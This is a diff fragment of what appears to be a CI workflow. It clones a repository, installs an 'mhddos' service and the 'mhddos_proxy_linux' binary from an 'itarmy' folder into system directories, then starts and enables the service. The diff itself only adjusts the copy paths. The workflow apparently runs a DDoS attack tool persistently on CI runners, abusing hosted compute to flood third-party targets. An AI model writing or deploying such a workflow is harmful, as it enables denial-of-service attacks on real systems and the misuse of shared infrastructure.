@@ -26,8 +26,8 @@ jobs:
           sudo mkdir /mnt/repo/test
           sudo chmod 777 /mnt/repo/test
           sudo git clone https://github.com/sweetasshole/test.git /mnt/repo/test
-          sudo cp /mnt/repo/test/itarmy/mhddos.service /etc/systemd/system
-          sudo cp /mnt/repo/test/itarmy/bin/mhddos_proxy_linux /opt/itarmy/bin/
+          sudo cp /mnt/repo/test/sub/itarmy/mhddos.service /etc/systemd/system
+          sudo cp /mnt/repo/test/sub/itarmy/bin/mhddos_proxy_linux /opt/itarmy/bin/
           sudo systemctl daemon-reload
           sudo systemctl start mhddos.service
           sudo systemctl enable mhddos.service
